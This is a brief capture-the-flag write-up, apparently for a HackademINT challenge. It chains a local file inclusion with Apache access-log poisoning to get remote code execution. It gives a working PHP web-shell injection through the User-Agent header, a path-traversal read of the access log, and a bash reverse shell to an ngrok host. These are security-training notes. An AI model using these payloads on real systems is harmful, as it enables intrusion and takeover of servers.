#Poising log

First we need an LFI
The get parameter **read** allows to read any file.

Then, for the RCE, we use Apache logs. We inject code through the User-Agent

I first use ngrok to redirect 0.tcp.ngrok.io:13753 to my 9001 port
Then, url encode the following command:
```bash
bash -c "bash -i >& /dev/tcp/0.tcp.ngrok.io/13753 0>&1"
```

And send the payload:
```bash
curl 'http://challs2.hackademint.org:13405//index.php?read=../../../var/log/apache2/access.log&c=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F0.tcp.ngrok.io%2F13753%200%3E%261%22' -H "User-Agent: <?php system(\$_GET['c']); ?>"
```
We got a shell :)
